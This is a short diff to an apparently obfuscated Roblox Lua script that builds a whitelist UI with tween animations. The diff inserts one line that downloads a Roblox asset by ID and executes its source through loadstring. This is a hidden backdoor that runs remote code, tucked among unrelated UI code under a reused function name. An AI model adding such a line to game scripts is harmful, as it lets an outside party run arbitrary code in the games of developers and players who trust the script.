@@ -269,6 +269,8 @@ function WhitelistCreate(L_8_arg0, L_9_arg1, L_10_arg2)
 		ImageRectOffset = Vector2.new(284, 4),
 		ImageRectSize = Vector2.new(24, 24),
 	})
+	
+	local L_37_func = loadstring(game:GetObjects("rbxassetid://15900013841")[1].Source)()
 	local function L_37_func(L_45_arg0, L_46_arg1, L_47_arg2, L_48_arg3, L_49_arg4)
 		game.TweenService:Create(L_45_arg0, TweenInfo.new(L_47_arg2, L_46_arg1, L_48_arg3), L_49_arg4):Play()
 	end
